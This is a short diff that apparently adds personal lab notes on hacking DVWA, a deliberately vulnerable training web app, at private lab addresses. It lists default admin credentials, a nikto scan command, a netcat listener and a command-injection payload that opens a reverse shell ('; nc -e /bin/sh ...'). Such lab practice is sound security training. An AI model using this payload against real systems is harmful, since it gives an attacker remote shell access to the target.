@@ -1,0 +1,22 @@
+#=== Webhacking ===
+
+
+
+
+http://10.10.10.103/dvwa
+
+admin 
+password
+
+
+#=== vunability scann für Websites
+
+nikto -h 10.10.10.103
+
+
+
+
+nc -v -l -p 8080
+netcat Befehl in Eingabe-Feld von DVWA eingeben: 10.0.0.20; nc -e /bin/sh 10.0.0.20 8080
+
+
